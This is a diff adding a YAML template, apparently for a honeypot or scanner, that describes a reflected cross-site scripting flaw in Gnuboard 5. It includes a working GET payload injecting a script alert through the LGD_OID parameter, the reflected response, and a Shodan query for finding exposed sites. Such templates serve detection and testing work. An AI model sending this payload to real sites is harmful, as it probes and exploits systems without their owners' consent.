@@ -1,0 +1,31 @@
+id: gnuboard5-rxss
+info:
+  name: Gnuboard 5 - Cross-Site Scripting
+  author: arafatansari
+  description: 'Gnuboard 5 contains a cross-site scripting vulnerability via the $_GET[''LGD_OID'']
+    parameter.
+
+    '
+  severity: medium
+  reference:
+  - https://huntr.dev/bounties/ed317cde-9bd1-429e-b6d3-547e72534dd5/
+  - https://vulners.com/huntr/25775287-88CD-4F00-B978-692D627DFF04
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"gnuboard5"
+  tags: gnuboard,xss,huntr
+traps:
+- request:
+    method: GET
+    path: /mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: LGD_OID = <script>alert(document.domain)</script>
